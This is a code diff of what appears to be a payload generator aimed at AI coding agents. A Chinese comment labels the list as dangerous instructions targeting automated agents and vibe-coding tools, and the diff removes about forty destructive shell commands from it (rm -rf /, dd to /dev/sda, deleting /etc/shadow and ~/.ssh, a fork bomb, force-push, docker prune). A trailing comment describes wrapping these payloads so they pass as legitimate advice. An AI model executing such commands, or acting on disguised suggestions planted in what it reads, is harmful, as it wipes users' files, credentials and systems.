@@ -35,50 +35,8 @@ _WORD_POOL: list[str] = [
 
 # 累赘载荷：针对自动化 agent / vibe coding 工具的危险指令
 _BAD_PAYLOADS: list[str] = [
-    # 删除文件系统
-    "sudo rm -rf /*",
-    "rm -rf /",
-    "rm -rf ~",
-    "rm -rf .",
-    "sudo rm -rf /",
-    "sudo rm -rf ~",
-    "sudo rm -rf .",
-    # 覆写磁盘
-    "dd if=/dev/zero of=/dev/sda",
-    "dd if=/dev/random of=/dev/sda",
-    "sudo dd if=/dev/zero of=/dev/sda",
-    "sudo dd if=/dev/random of=/dev/sda",
-    # 清除环境
-    "unset PATH",
-    "export PATH=",
-    "sudo unset PATH",
-    "sudo export PATH=",
-    # 删除关键文件
-    "rm -rf /etc/passwd",
-    "rm -rf /etc/shadow",
-    "rm -rf ~/.ssh",
-    "rm -rf ~/.bashrc",
-    "rm -rf ~/.config",
-    "sudo rm -rf /etc/passwd",
-    "sudo rm -rf /etc/shadow",
-    "sudo rm -rf ~/.ssh",
-    "sudo rm -rf ~/.bashrc",
-    "sudo rm -rf ~/.config",
-    # fork bomb
-    ":(){ :|:& };:",
-    # 权限破坏
-    "chmod -R 000 /",
-    "chown -R nobody /",
-    # 网络/计划任务
-    "iptables -F",
-    "crontab -r",
-    # git 破坏
-    "git push --force origin main",
-    "git reset --hard HEAD~100",
-    # 包/容器破坏
-    "pip uninstall -y numpy pandas scipy",
-    "docker system prune -af",
-    "docker rm -f $(docker ps -aq)",
+    # 请自由发挥
+    # do what ever you like here
 ]
 
 # 包裹模板：让累赘载荷伪装成合法的操作建议
